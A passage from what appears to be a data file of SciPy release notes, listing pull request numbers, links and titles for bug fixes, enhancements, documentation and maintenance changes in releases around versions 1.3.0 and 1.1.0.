<https://github.com/scipy/scipy/pull/9749>`__: BUG: MapWrapper.__exit__ should terminate\n* `9753 <https://github.com/scipy/scipy/pull/9753>`__: ENH: Added exact computation for Kolmogorov-Smirnov two-sample...\n* `9755 <https://github.com/scipy/scipy/pull/9755>`__: DOC: Added example for signal.impulse, copied from impulse2\n* `9756 <https://github.com/scipy/scipy/pull/9756>`__: DOC: Added docstring example for iirdesign\n* `9757 <https://github.com/scipy/scipy/pull/9757>`__: DOC: Added examples for step functions\n* `9759 <https://github.com/scipy/scipy/pull/9759>`__: ENH: Allow pass_zero to act like btype\n* `9760 <https://github.com/scipy/scipy/pull/9760>`__: DOC: Added docstring for lp2bs\n* `9761 <https://github.com/scipy/scipy/pull/9761>`__: DOC: Added docstring and example for lp2bp\n* `9764 <https://github.com/scipy/scipy/pull/9764>`__: BUG: Catch internal warnings for matrix\n* `9766 <https://github.com/scipy/scipy/pull/9766>`__: ENH: Speed up _gaussian_kernel1d by removing dependence on np.polynomial\n* `9769 <https://github.com/scipy/scipy/pull/9769>`__: BUG: Fix Cubic Spline Read Only issues\n* `9773 <https://github.com/scipy/scipy/pull/9773>`__: DOC: Several docstrings\n* `9774 <https://github.com/scipy/scipy/pull/9774>`__: TST: bump Azure CI OpenBLAS version to match wheels\n* `9775 <https://github.com/scipy/scipy/pull/9775>`__: DOC: Improve clarity of cov_x documentation for scipy.optimize.leastsq\n* `9779 <https://github.com/scipy/scipy/pull/9779>`__: ENH: dual_annealing vectorise visit_fn\n* `9788 <https://github.com/scipy/scipy/pull/9788>`__: TST, BUG: f2py-related issues with NumPy < 1.14.0\n* `9791 <https://github.com/scipy/scipy/pull/9791>`__: BUG: fix amax constraint not enforced in scalar_search_wolfe2\n* `9792 <https://github.com/scipy/scipy/pull/9792>`__: ENH: Allow inplace copying in place in \"detrend\" function\n* `9795 <https://github.com/scipy/scipy/pull/9795>`__: DOC: Fix/update docstring for dstn and dst\n* `9796 <https://github.com/scipy/scipy/pull/9796>`__: MAINT: Allow None tolerances in least_squares\n* `9798 <https://github.com/scipy/scipy/pull/9798>`__: BUG: fixes abort trap 6 error in scipy issue 9785 in unit tests\n* `9807 <https://github.com/scipy/scipy/pull/9807>`__: MAINT: improve doc and add alternative keyword to wilcoxon in...\n* `9808 <https://github.com/scipy/scipy/pull/9808>`__: Fix PPoly integrate and test for CubicSpline\n* `9810 <https://github.com/scipy/scipy/pull/9810>`__: ENH: Add the geometric standard deviation function\n* `9811 <https://github.com/scipy/scipy/pull/9811>`__: MAINT: remove invalid derphi default None value in scalar_search_wolfe2\n* `9813 <https://github.com/scipy/scipy/pull/9813>`__: Adapt hamming distance in C to support weights\n* `9817 <https://github.com/scipy/scipy/pull/9817>`__: DOC: Copy solver description to solver modules\n* `9829 <https://github.com/scipy/scipy/pull/9829>`__: ENH: Add FOH and equivalent impulse response discretizations...\n* `9831 <https://github.com/scipy/scipy/pull/9831>`__: ENH: Implement RotationSpline\n* `9834 <https://github.com/scipy/scipy/pull/9834>`__: DOC: Change mielke distribution default parameters to ensure...\n* `9838 <https://github.com/scipy/scipy/pull/9838>`__: ENH: Use faster solvers for firls\n* `9854 <https://github.com/scipy/scipy/pull/9854>`__: ENH: loadarff now supports relational attributes.\n* `9856 <https://github.com/scipy/scipy/pull/9856>`__: integrate.bvp - improve handling of nonlinear boundary conditions\n* `9862 <https://github.com/scipy/scipy/pull/9862>`__: TST: reduce Appveyor CI load\n* `9874 <https://github.com/scipy/scipy/pull/9874>`__: DOC: Update requirements in release notes\n* `9883 <https://github.com/scipy/scipy/pull/9883>`__: BUG: fixed parenthesis in spatial.rotation\n* `9884 <https://github.com/scipy/scipy/pull/9884>`__: ENH: Use Sparsity in Clarkson-Woodruff Sketch\n* `9888 <https://github.com/scipy/scipy/pull/9888>`__: MAINT: Replace NumPy aliased functions\n* `9892 <https://github.com/scipy/scipy/pull/9892>`__: BUG: Fix 9890 query_ball_point returns wrong result when p is...\n* `9893 <https://github.com/scipy/scipy/pull/9893>`__: BUG: curve_fit doesn't check for empty input if called with bounds\n* `9894 <https://github.com/scipy/scipy/pull/9894>`__: scipy.signal.find_peaks documentation error\n* `9898 <https://github.com/scipy/scipy/pull/9898>`__: BUG: Set success attribute in OptimizeResult. See #9801\n* `9900 <https://github.com/scipy/scipy/pull/9900>`__: BUG: Restrict rv_generic._argcheck() and its overrides from setting...\n* `9906 <https://github.com/scipy/scipy/pull/9906>`__: fixed a bug in kde logpdf\n* `9911 <https://github.com/scipy/scipy/pull/9911>`__: DOC: replace example for \"np.select\" with the one from numpy...\n* `9912 <https://github.com/scipy/scipy/pull/9912>`__: BF(DOC): point to numpy.select instead of plain (python) .select\n* `9914 <https://github.com/scipy/scipy/pull/9914>`__: DOC: change ValueError message in _validate_pad of signaltools.\n* `9915 <https://github.com/scipy/scipy/pull/9915>`__: cKDTree query_ball_point improvements\n* `9918 <https://github.com/scipy/scipy/pull/9918>`__: Update ckdtree.pyx with boxsize argument in docstring\n* `9920 <https://github.com/scipy/scipy/pull/9920>`__: BUG: sparse: Validate explicit shape if given with dense argument...\n* `9924 <https://github.com/scipy/scipy/pull/9924>`__: BLD: add back pyproject.toml\n* `9931 <https://github.com/scipy/scipy/pull/9931>`__: Fix empty constraint\n* `9935 <https://github.com/scipy/scipy/pull/9935>`__: DOC: fix references for stats.f_oneway\n* `9936 <https://github.com/scipy/scipy/pull/9936>`__: Revert gh-9619: \"FIX: Sparse matrix addition/subtraction eliminates...\n* `9937 <https://github.com/scipy/scipy/pull/9937>`__: MAINT: fix PEP8 issues and update to pycodestyle 2.5.0\n* `9939 <https://github.com/scipy/scipy/pull/9939>`__: DOC: correct \\`structure\\` description in \\`ndimage.label\\` docstring\n* `9940 <https://github.com/scipy/scipy/pull/9940>`__: MAINT: remove extraneous distutils copies\n* `9945 <https://github.com/scipy/scipy/pull/9945>`__: ENH: differential_evolution can use Bounds object\n* `9949 <https://github.com/scipy/scipy/pull/9949>`__: Added 'std' to add doctstrings since it is a \\`known_stats\\`...\n* `9953 <https://github.com/scipy/scipy/pull/9953>`__: DOC: Documentation cleanup for stats tutorials.\n* `9962 <https://github.com/scipy/scipy/pull/9962>`__: __repr__ for Bounds\n* `9971 <https://github.com/scipy/scipy/pull/9971>`__: ENH: Improve performance of lsmr\n* `9987 <https://github.com/scipy/scipy/pull/9987>`__: CI: pin Sphinx version to 1.8.5\n* `9990 <https://github.com/scipy/scipy/pull/9990>`__: ENH: constraint violation\n* `9991 <https://github.com/scipy/scipy/pull/9991>`__: BUG: Avoid inplace modification of input array in newton\n* `9995 <https://github.com/scipy/scipy/pull/9995>`__: MAINT: sparse.csgraph: Add cdef to stop build warning.\n* `9996 <https://github.com/scipy/scipy/pull/9996>`__: BUG: Make minimize_quadratic_1d work with infinite bounds correctly\n* `10004 <https://github.com/scipy/scipy/pull/10004>`__: BUG: Fix unbound local error in linprog - simplex.\n* `10007 <https://github.com/scipy/scipy/pull/10007>`__: BLD: fix Python 3.7 build with build isolation\n* `10009 <https://github.com/scipy/scipy/pull/10009>`__: BUG: Make sure that _binary_erosion only accepts an integer number...\n* `10016 <https://github.com/scipy/scipy/pull/10016>`__: Update link to airspeed-velocity\n* `10017 <https://github.com/scipy/scipy/pull/10017>`__: DOC: Update \\`interpolate.LSQSphereBivariateSpline\\` to include...\n* `10018 <https://github.com/scipy/scipy/pull/10018>`__: MAINT: special: Fix a few warnings that occur when compiling...\n* `10019 <https://github.com/scipy/scipy/pull/10019>`__: TST: Azure summarizes test failures\n* `10021 <https://github.com/scipy/scipy/pull/10021>`__: ENH: Introduce CubicHermiteSpline\n* `10022 <https://github.com/scipy/scipy/pull/10022>`__: BENCH: Increase cython version in asv to fix benchmark builds\n* `10023 <https://github.com/scipy/scipy/pull/10023>`__: BUG: Avoid exponnorm producing nan for small K values.\n* `10025 <https://github.com/scipy/scipy/pull/10025>`__: BUG: optimize: tweaked linprog status 4 error message\n* `10026 <https://github.com/scipy/scipy/pull/10026>`__: ENH: optimize: use SuiteSparse in linprog interior-point when...\n* `10027 <https://github.com/scipy/scipy/pull/10027>`__: MAINT: cluster: clean up the use of malloc() in the function...\n* `10028 <https://github.com/scipy/scipy/pull/10028>`__: Fix rotate invalid plane check\n* `10040 <https://github.com/scipy/scipy/pull/10040>`__: MAINT: fix pratt method of wilcox test in scipy.stats\n* `10041 <https://github.com/scipy/scipy/pull/10041>`__: MAINT: special: Fix a warning generated when building the AMOS...\n* `10044 <https://github.com/scipy/scipy/pull/10044>`__: DOC: fix up spatial.transform.Rotation docstrings\n* `10047 <https://github.com/scipy/scipy/pull/10047>`__: MAINT: interpolate: Fix a few build warnings.\n* `10051 <https://github.com/scipy/scipy/pull/10051>`__: Add project_urls to setup\n* `10052 <https://github.com/scipy/scipy/pull/10052>`__: don't set flag to \"converged\" if max iter exceeded\n* `10054 <https://github.com/scipy/scipy/pull/10054>`__: MAINT: signal: Fix a few build warnings and modernize some C...\n* `10056 <https://github.com/scipy/scipy/pull/10056>`__: BUG: Ensure factorial is not too large in kendaltau\n* `10058 <https://github.com/scipy/scipy/pull/10058>`__: Small speedup in samping from ortho and special_ortho groups\n* `10059 <https://github.com/scipy/scipy/pull/10059>`__: BUG: optimize: fix #10038 by increasing tol\n* `10061 <https://github.com/scipy/scipy/pull/10061>`__: BLD: DOC: make building docs easier by parsing python version.\n* `10064 <https://github.com/scipy/scipy/pull/10064>`__: ENH: Significant speedup for ortho and special ortho group\n* `10065 <https://github.com/scipy/scipy/pull/10065>`__: DOC: Reword parameter descriptions in \\`optimize.root_scalar\\`\n* `10066 <https://github.com/scipy/scipy/pull/10066>`__: BUG: signal: Fix error raised by savgol_coeffs when deriv > polyorder.\n* `10067 <https://github.com/scipy/scipy/pull/10067>`__: MAINT: Fix the cutoff value inconsistency for pinv2 and pinvh\n* `10072 <https://github.com/scipy/scipy/pull/10072>`__: BUG: stats: Fix boxcox_llf to avoid loss of precision.\n* `10075 <https://github.com/scipy/scipy/pull/10075>`__: ENH: Add wrappers for ?syconv routines\n* `10076 <https://github.com/scipy/scipy/pull/10076>`__: BUG: optimize: fix curve_fit for mixed float32/float64 input\n* `10077 <https://github.com/scipy/scipy/pull/10077>`__: DOC: Replace undefined \\`k\\` in \\`interpolate.splev\\` docstring\n* `10079 <https://github.com/scipy/scipy/pull/10079>`__: DOC: Fixed typo, rearranged some doc of stats.morestats.wilcoxon.\n* `10080 <https://github.com/scipy/scipy/pull/10080>`__: TST: install scikit-sparse for full TravisCI tests\n* `10083 <https://github.com/scipy/scipy/pull/10083>`__: Clean \\`\\`_clean_inputs\\`\\` in optimize.linprog\n* `10088 <https://github.com/scipy/scipy/pull/10088>`__: ENH: optimize: linprog test CHOLMOD/UMFPACK solvers when available\n* `10090 <https://github.com/scipy/scipy/pull/10090>`__: MAINT: Fix CubicSplinerInterpolator for pandas\n* `10091 <https://github.com/scipy/scipy/pull/10091>`__: MAINT: improve logcdf and logsf of hypergeometric distribution\n* `10095 <https://github.com/scipy/scipy/pull/10095>`__: MAINT: Clean \\`\\`_clean_inputs\\`\\` in linprog\n* `10116 <https://github.com/scipy/scipy/pull/10116>`__: MAINT: update scipy-sphinx-theme\n* `10135 <https://github.com/scipy/scipy/pull/10135>`__: BUG: fix linprog revised simplex docstring problem failure\n\n\n==========================\n", "1.1.0": "-----------------------\n\n* `6590 <https://github.com/scipy/scipy/pull/6590>`__: BUG: sparse: fix custom rvs callable argument in sparse.random\n* `7004 <https://github.com/scipy/scipy/pull/7004>`__: ENH: scipy.linalg.eigsh cannot get all eigenvalues\n* `7120 <https://github.com/scipy/scipy/pull/7120>`__: ENH: implemented Owen's T function\n* `7483 <https://github.com/scipy/scipy/pull/7483>`__: ENH: Addition/multiplication operators for StateSpace systems\n* `7566 <https://github.com/scipy/scipy/pull/7566>`__: Informative exception when passing a sparse matrix\n* `7592 <https://github.com/scipy/scipy/pull/7592>`__: Adaptive Nelder-Mead\n* `7729 <https://github.com/scipy/scipy/pull/7729>`__: WIP: ENH: optimize: large-scale constrained optimization algorithms...\n* `7802 <https://github.com/scipy/scipy/pull/7802>`__: MRG: Add dpss window function\n* `7803 <https://github.com/scipy/scipy/pull/7803>`__: DOC: Add examples to spatial.distance\n* `7821 <https://github.com/scipy/scipy/pull/7821>`__: Add Returns section to the docstring\n* `7833 <https://github.com/scipy/scipy/pull/7833>`__: ENH: Performance improvements in scipy.linalg.special_matrices\n* `7864 <https://github.com/scipy/scipy/pull/7864>`__: MAINT: sparse: Simplify sputils.isintlike\n* `7865 <https://github.com/scipy/scipy/pull/7865>`__: ENH: Improved speed of copy into L, U matrices\n* `7871 <https://github.com/scipy/scipy/pull/7871>`__: ENH: sparse: Add 64-bit integer to sparsetools\n* `7879 <https://github.com/scipy/scipy/pull/7879>`__: ENH: re-enabled old sv lapack routine as defaults\n* `7889 <https://github.com/scipy/scipy/pull/7889>`__: DOC: Show probability density functions as math\n* `7900 <https://github.com/scipy/scipy/pull/7900>`__: API: Soft deprecate signal.* windows\n* `7910 <https://github.com/scipy/scipy/pull/7910>`__: ENH: allow `sqrtm` to compute the root of some singular matrices\n* `7911 <https://github.com/scipy/scipy/pull/7911>`__: MAINT: Avoid unnecessary array copies in xdist\n* `7913 <https://github.com/scipy/scipy/pull/7913>`__: DOC: Clarifies the meaning of `initial` of scipy.integrate.cumtrapz()\n* `7916 <https://github.com/scipy/scipy/pull/7916>`__: BUG: sparse.linalg: fix wrong use of __new__ in LinearOperator\n* `7921 <https://github.com/scipy/scipy/pull/7921>`__: BENCH: split spatial benchmark imports\n* `7927 <https://github.com/scipy/scipy/pull/7927>`__: ENH: added sygst/hegst routines to lapack\n* `7934 <https://github.com/scipy/scipy/pull/7934>`__: MAINT: add `io/_test_fortranmodule` to `.gitignore`\n* `7936 <https://github.com/scipy/scipy/pull/7936>`__: DOC: Fixed typo in scipy.special.roots_jacobi documentation\n* `7937 <https://github.com/scipy/scipy/pull/7937>`__: MAINT: special: Mark a test that fails on i686 as a known failure.\n* `7941 <https://github.com/scipy/scipy/pull/7941>`__: ENH: LDLt decomposition for indefinite symmetric/hermitian matrices\n* `7945 <https://github.com/scipy/scipy/pull/7945>`__: ENH: Implement reshape method on sparse matrices\n* `7947 <https://github.com/scipy/scipy/pull/7947>`__: DOC: update docs on releasing and installing/upgrading\n* `7954 <https://github.com/scipy/scipy/pull/7954>`__: Basin-hopping changes\n* `7964 <https://github.com/scipy/scipy/pull/7964>`__: BUG: test_falker not robust against numerical fuss in eigenvalues\n* `7967 <https://github.com/scipy/scipy/pull/7967>`__: QUADPACK Errors - human friendly errors to replace 'Invalid Input'\n* `7975 <https://github.com/scipy/scipy/pull/7975>`__: Make sure integrate.quad doesn't double-count singular points\n* `7978 <https://github.com/scipy/scipy/pull/7978>`__: TST: ensure negative weights are not allowed in distance metrics\n* `7980 <https://github.com/scipy/scipy/pull/7980>`__: MAINT: Truncate the warning msg about ill-conditioning\n* `7981 <https://github.com/scipy/scipy/pull/7981>`__: BUG: special: fix hyp2f1 behavior in certain circumstances\n* `7983 <https://github.com/scipy/scipy/pull/7983>`__: ENH: special: Add a real dispatch to `loggamma`\n* `7989 <https://github.com/scipy/scipy/pull/7989>`__: BUG: special: make `kv` return `inf` at a zero real argument\n* `7990 <https://github.com/scipy/scipy/pull/7990>`__: TST: special: test ufuncs in special at `nan` inputs\n* `7994 <https://github.com/scipy/scipy/pull/7994>`__: DOC: special: fix typo in spherical Bessel function documentation\n* `7995 <https://github.com/scipy/scipy/pull/7995>`__: ENH: linalg: add null_space for computing null spaces via svd\n* `7999 <https://github.com/scipy/scipy/pull/7999>`__: BUG: optimize: Protect _minpack calls with a lock.\n* `8003 <https://github.com/scipy/scipy/pull/8003>`__: MAINT: consolidate c99 compatibility\n* `8004 <https://github.com/scipy/scipy/pull/8004>`__: TST: special: get all `cython_special` tests running again\n* `8006 <https://github.com/scipy/scipy/pull/8006>`__: MAINT: Consolidate an additional _c99compat.h\n* `8011 <https://github.com/scipy/scipy/pull/8011>`__: Add new example of integrate.quad\n* `8015 <https://github.com/scipy/scipy/pull/8015>`__: DOC: special: remove `jn` from the refguide (again)\n* `8018 <https://github.com/scipy/scipy/pull/8018>`__: BUG - Issue with uint datatypes for array in get_index_dtype\n* `8021 <https://github.com/scipy/scipy/pull/8021>`__: DOC: spatial: Simplify Delaunay plotting\n* `8024 <https://github.com/scipy/scipy/pull/8024>`__: Documentation fix\n* `8027 <https://github.com/scipy/scipy/pull/8027>`__: BUG: io.matlab: fix saving unicode matrix names on py2\n* `8028 <https://github.com/scipy/scipy/pull/8028>`__: BUG: special: some fixes for `lambertw`\n* `8030 <https://github.com/scipy/scipy/pull/8030>`__: MAINT: Bump Cython version\n* `8034 <https://github.com/scipy/scipy/pull/8034>`__: BUG: sparse.linalg: fix corner-case bug in expm\n* `8035 <https://github.com/scipy/scipy/pull/8035>`__: MAINT: special: remove complex division hack\n* `8038 <https://github.com/scipy/scipy/pull/8038>`__: ENH: Cythonize pyx files if pxd dependencies change\n* `8042 <https://github.com/scipy/scipy/pull/8042>`__: TST: stats: reduce required precision in test_fligner\n* `8043 <https://github.com/scipy/scipy/pull/8043>`__: TST: Use diff. values for decimal keyword for single and doubles\n* `8044 <https://github.com/scipy/scipy/pull/8044>`__: TST: accuracy of tests made different for singles and doubles\n* `8049 <https://github.com/scipy/scipy/pull/8049>`__: Unhelpful error message when calling scipy.sparse.save_npz on...\n* `8052 <https://github.com/scipy/scipy/pull/8052>`__: TST: spatial: add a regression test for gh-8051\n* `8059 <https://github.com/scipy/scipy/pull/8059>`__: BUG: special: fix ufunc results for `nan` arguments\n* `8066 <https://github.com/scipy/scipy/pull/8066>`__: MAINT: special: reimplement inverses of incomplete gamma functions\n* `8072 <https://github.com/scipy/scipy/pull/8072>`__: Example for scipy.fftpack.ifft, https://github.com/scipy/scipy/issues/7168\n* `8073 <https://github.com/scipy/scipy/pull/8073>`__: Example for ifftn, https://github.com/scipy/scipy/issues/7168\n* `8078 <https://github.com/scipy/scipy/pull/8078>`__: Link to CoC in contributing.rst doc\n* `8085 <https://github.com/scipy/scipy/pull/8085>`__: BLD: Fix npy_isnan of integer variables in cephes\n* `8088 <https://github.com/scipy/scipy/pull/8088>`__: DOC: note version for which new attributes have been added to...\n* `8090 <https://github.com/scipy/scipy/pull/8090>`__: BUG: special: add nan check to `_legacy_cast_check` functions\n* `8091 <https://github.com/scipy/scipy/pull/8091>`__: Doxy Typos + trivial comment typos (2nd attempt)\n* `8096 <https://github.com/scipy/scipy/pull/8096>`__: TST: special: simplify `Arg`\n* `8101 <https://github.com/scipy/scipy/pull/8101>`__: MAINT: special: run `_generate_pyx.py` when `add_newdocs.py`...\n* `8104 <https://github.com/scipy/scipy/pull/8104>`__: Input checking for scipy.sparse.linalg.inverse()\n* `8105 <https://github.com/scipy/scipy/pull/8105>`__: DOC: special: Update the 'euler' docstring.\n* `8109 <https://github.com/scipy/scipy/pull/8109>`__: MAINT: fixing code comments and hyp2f1 docstring: see issues...\n* `8112 <https://github.com/scipy/scipy/pull/8112>`__: More trivial typos\n* `8113 <https://github.com/scipy/scipy/pull/8113>`__: MAINT: special: generate test data npz files in setup.py and...\n* `8116 <https://github.com/scipy/scipy/pull/8116>`__: DOC: add build instructions\n* `8120 <https://github.com/scipy/scipy/pull/8120>`__: DOC: Clean up README\n* `8121 <https://github.com/scipy/scipy/pull/8121>`__: DOC: Add missing colons in docstrings\n* `8123 <https://github.com/scipy/scipy/pull/8123>`__: BLD: update Bento build config files for recent C99 changes.\n* `8124 <https://github.com/scipy/scipy/pull/8124>`__: Change to avoid use of `fmod` in scipy.signal.chebwin\n* `8126 <https://github.com/scipy/scipy/pull/8126>`__: Added examples for mode arg in geometric_transform\n* `8128 <https://github.com/scipy/scipy/pull/8128>`__: relax relative tolerance parameter in TestMinumumPhase.test_hilbert\n* `8129 <https://github.com/scipy/scipy/pull/8129>`__: ENH: special: use rational approximation for \\`digamma\\` on \\`[1,...\n* `8137 <https://github.com/scipy/scipy/pull/8137>`__: DOC Correct matrix width\n* `8141 <https://github.com/scipy/scipy/pull/8141>`__: MAINT: optimize: remove unused `__main__` code in L-BSGS-B\n* `8147 <https://github.com/scipy/scipy/pull/8147>`__: BLD: update Bento build for removal of .npz scipy.special test...\n* `8148 <https://github.com/scipy/scipy/pull/8148>`__: Alias hanning as an explanatory function of hann\n* `8149 <https://github.com/scipy/scipy/pull/8149>`__: MAINT: special: small fixes for `digamma`\n* `8159 <https://github.com/scipy/scipy/pull/8159>`__: Update version classifiers\n* `8164 <https://github.com/scipy/scipy/pull/8164>`__: BUG: riccati solvers don't catch ill-conditioned problems sufficiently...\n* `8168 <https://github.com/scipy/scipy/pull/8168>`__: DOC: release note for sparse resize methods\n* `8170 <https://github.com/scipy/scipy/pull/8170>`__: BUG: correctly pad netCDF files with null bytes\n* `8171 <https://github.com/scipy/scipy/pull/8171>`__: ENH added normal inverse gaussian distribution to scipy.stats\n* `8175 <https://github.com/scipy/scipy/pull/8175>`__: DOC: Add example to scipy.ndimage.zoom\n* `8177 <https://github.com/scipy/scipy/pull/8177>`__: MAINT: diffev small speedup in ensure constraint\n* `8178 <https://github.com/scipy/scipy/pull/8178>`__: FIX: linalg._qz String formatter syntax error\n* `8179 <https://github.com/scipy/scipy/pull/8179>`__: TST: Added pdist to asv spatial benchmark suite\n* `8180 <https://github.com/scipy/scipy/pull/8180>`__: TST: ensure constraint test improved\n* `8183 <https://github.com/scipy/scipy/pull/8183>`__: 0d conj correlate\n* `8186 <https://github.com/scipy/scipy/pull/8186>`__: BUG: special: fix derivative of ``spherical_jn(1, 0)``\n* `8194 <https://github.com/scipy/scipy/pull/8194>`__: Fix warning message\n* `8196 <https://github.com/scipy/scipy/pull/8196>`__: BUG: correctly handle inputs with nan's and ties in spearmanr\n* `8198 <https://github.com/scipy/scipy/pull/8198>`__: MAINT: stats.triang edge case fixes #6036\n* `8200 <https://github.com/scipy/scipy/pull/8200>`__: DOC: Completed \"Examples\" sections of all linalg funcs\n* `8201 <https://github.com/scipy/scipy/pull/8201>`__: MAINT: stats.trapz edge cases\n* `8204 <https://github.com/scipy/scipy/pull/8204>`__: ENH: sparse.linalg/lobpcg: change .T to .T.conj() to support...\n* `8206 <https://github.com/scipy/scipy/pull/8206>`__: MAINT: missed triang edge case.\n* `8214 <https://github.com/scipy/scipy/pull/8214>`__: BUG: Fix memory corruption in linalg._decomp_update C extension\n* `8222 <https://github.com/scipy/scipy/pull/8222>`__: DOC: recommend scipy.integrate.solve_ivp\n* `8223 <https://github.com/scipy/scipy/pull/8223>`__: ENH: added Moyal distribution to scipy.stats\n* `8232 <https://github.com/scipy/scipy/pull/8232>`__: BUG: sparse: Use deduped data for numpy ufuncs\n* `8236 <https://github.com/scipy/scipy/pull/8236>`__: Fix #8235\n* `8253 <https://github.com/scipy/scipy/pull/8253>`__: BUG: optimize: fix bug related with function call calculation...\n* `8264 <https://github.com/scipy/scipy/pull/8264>`__: ENH: Extend peak finding capabilities in scipy.signal\n* `8273 <https://github.com/scipy/scipy/pull/8273>`__: BUG fixed printing of convergence message in minimize_scalar...\n* `8276 <https://github.com/scipy/scipy/pull/8276>`__: DOC: Add notes to explain constrains on overwrite_<>\n* `8279 <https://github.com/scipy/scipy/pull/8279>`__: CI: fixing doctests\n* `8282 <https://github.com/scipy/scipy/pull/8282>`__: MAINT: weightedtau, change search for nan\n* `8287 <https://github.com/scipy/scipy/pull/8287>`__: Improving documentation of solve_ivp and the underlying solvers\n* `8291 <https://github.com/scipy/scipy/pull/8291>`__: DOC: fix non-ascii characters in docstrings which broke the doc...\n* `8292 <https://github.com/scipy/scipy/pull/8292>`__: CI: use numpy 1.13 for refguide check build\n* `8296 <https://github.com/scipy/scipy/pull/8296>`__: Fixed bug reported in issue #8181\n* `8297 <https://github.com/scipy/scipy/pull/8297>`__: DOC: Examples for linalg/decomp eigvals function\n* `8300 <https://github.com/scipy/scipy/pull/8300>`__: MAINT: Housekeeping for minimizing the linalg compiler warnings\n* `8301 <https://github.com/scipy/scipy/pull/8301>`__: DOC: make public API documentation cross-link to refguide.\n* `8302 <https://github.com/scipy/scipy/pull/8302>`__: make sure _onenorm_matrix_power_nnm actually returns a float\n* `8313 <https://github.com/scipy/scipy/pull/8313>`__: Change copyright to outdated 2008-2016 to 2008-year\n* `8315 <https://github.com/scipy/scipy/pull/8315>`__: TST: Add tests for \\`scipy.sparse.linalg.isolve.minres\\`\n* `8318 <https://github.com/scipy/scipy/pull/8318>`__: ENH: odeint: Add the argument 'tfirst' to odeint.\n* `8328 <https://github.com/scipy/scipy/pull/8328>`__: ENH: optimize: ``trust-constr`` optimization algorithms [GSoC...\n* `8330 <https://github.com/scipy/scipy/pull/8330>`__: ENH: add a maxiter argument to NNLS\n* `8331 <https://github.com/scipy/scipy/pull/8331>`__: DOC: tweak the Moyal distribution docstring\n* `8333 <https://github.com/scipy/scipy/pull/8333>`__: FIX: Rewrapped ?gels and ?gels_lwork routines\n* `8336 <https://github.com/scipy/scipy/pull/8336>`__: MAINT: integrate: handle b < a in quad\n* `8337 <https://github.com/scipy/scipy/pull/8337>`__: BUG: special: Ensure zetac(1) returns inf.\n* `8347 <https://github.com/scipy/scipy/pull/8347>`__: BUG: Fix overflow in special.binom. Issue #8346\n* `8356 <https://github.com/scipy/scipy/pull/8356>`__: DOC: Corrected Documentation Issue #7750 winsorize function\n* `8358 <https://github.com/scipy/scipy/pull/8358>`__: ENH: stats: Use explicit MLE formulas in lognorm.fit and expon.fit\n* `8374 <https://github.com/scipy/scipy/pull/8374>`__: BUG: gh7854, maxiter for l-bfgs-b closes #7854\n* `8379 <https://github.com/scipy/scipy/pull/8379>`__: CI: enable gcov coverage on travis\n* `8383 <https://github.com/scipy/scipy/pull/8383>`__: Removed collections.OrderedDict import ignore.\n* `8384 <https://github.com/scipy/scipy/pull/8384>`__: TravisCI: tool pep8 is now pycodestyle\n* `8387 <https://github.com/scipy/scipy/pull/8387>`__: MAINT: special: remove unused specfun code for Struve functions\n* `8393 <https://github.com/scipy/scipy/pull/8393>`__: DOC: Replace old type names in ndimage tutorial.\n* `8400 <https://github.com/scipy/scipy/pull/8400>`__: Fix tolerance specification in sparse.linalg iterative solvers\n* `8402 <https://github.com/scipy/scipy/pull/8402>`__: MAINT: Some small cleanups in ndimage.\n* `8403 <https://github.com/scipy/scipy/pull/8403>`__: FIX: Make scipy.optimize.zeros run under PyPy\n* `8407 <https://github.com/scipy/scipy/pull/8407>`__: BUG: sparse.linalg: fix termination bugs for cg, cgs\n* `8409 <https://github.com/scipy/scipy/pull/8409>`__: MAINT: special: add a `.pxd` file for Cephes functions\n* `8412 <https://github.com/scipy/scipy/pull/8412>`__: MAINT: special: remove `cephes/protos.h`\n* `8421 <https://github.com/scipy/scipy/pull/8421>`__: Setting \"unknown\" message in OptimizeResult when calling MINPACK.\n* `8423 <https://github.com/scipy/scipy/pull/8423>`__: FIX: Handle unsigned integers in mmio\n* `8426 <https://github.com/scipy/scipy/pull/8426>`__: DOC: correct FAQ entry on Apache license compatibility. Closes...\n* `8433 <https://github.com/scipy/scipy/pull/8433>`__: MAINT: add `.pytest_cache` to the `.gitignore`\n* `8436 <https://github.com/scipy/scipy/pull/8436>`__: MAINT: scipy.sparse: less copies at transpose method\n* `8437 <https://github.com/scipy/scipy/pull/8437>`__: BUG: correct behavior for skew-symmetric matrices in io.mmwrite\n* `8440 <https://github.com/scipy/scipy/pull/8440>`__: DOC:Add examples to integrate.quadpack docstrings\n* `8441 <https://github.com/scipy/scipy/pull/8441>`__: BUG: sparse.linalg/gmres: deal with exact breakdown in gmres\n* `8442 <https://github.com/scipy/scipy/pull/8442>`__: MAINT: special: clean up Cephes header files\n* `8448 <https://github.com/scipy/scipy/pull/8448>`__: TST: Generalize doctest stopwords .axis( .plot(\n* `8457 <https://github.com/scipy/scipy/pull/8457>`__: MAINT: special: use JSON for function signatures in `_generate_pyx.py`\n* `8461 <https://github.com/scipy/scipy/pull/8461>`__: MAINT: Simplify return value of ndimage functions.\n* `8464 <https://github.com/scipy/scipy/pull/8464>`__: MAINT: Trivial typos\n* `8474 <https://github.com/scipy/scipy/pull/8474>`__: BUG: spatial: make qhull.pyx more pypy-friendly\n* `8476 <https://github.com/scipy/scipy/pull/8476>`__: TST: _lib: disable refcounting tests on PyPy\n* `8479 <https://github.com/scipy/scipy/pull/8479>`__: BUG: io/matlab: fix issues in matlab i/o on pypy\n* `8481 <https://github.com/scipy/scipy/pull/8481>`__: DOC: Example for signal.cmplx_sort\n* `8482 <https://github.com/scipy/scipy/pull/8482>`__: TST: integrate: use integers instead of PyCapsules to store pointers\n* `8483 <https://github.com/scipy/scipy/pull/8483>`__: ENH: io/netcdf: make mmap=False the default on PyPy\n* `8484 <https://github.com/scipy/scipy/pull/8484>`__: BUG: io/matlab: work around issue in to_writeable on PyPy\n* `8488 <https://github.com/scipy/scipy/pull/8488>`__: MAINT: special: add const/static specifiers where possible\n* `8489 <https://github.com/scipy/scipy/pull/8489>`__: BUG: ENH: use common halley's method instead of parabolic variant\n* `8491 <https://github.com/scipy/scipy/pull/8491>`__: DOC: fix typos\n* `8496 <https://github.com/scipy/scipy/pull/8496>`__: ENH: special: make Chebyshev nodes symmetric\n* `8501 <https://github.com/scipy/scipy/pull/8501>`__: BUG: stats: Split the integral used to compute skewnorm.cdf.\n* `8502 <https://github.com/scipy/scipy/pull/8502>`__: WIP: Port CircleCI to v2\n* `8507 <https://github.com/scipy/scipy/pull/8507>`__: DOC: Add missing description to `brute_force` parameter.\n* `8509 <https://github.com/scipy/scipy/pull/8509>`__: BENCH: forgot to add nelder-mead to list of methods\n* `8512 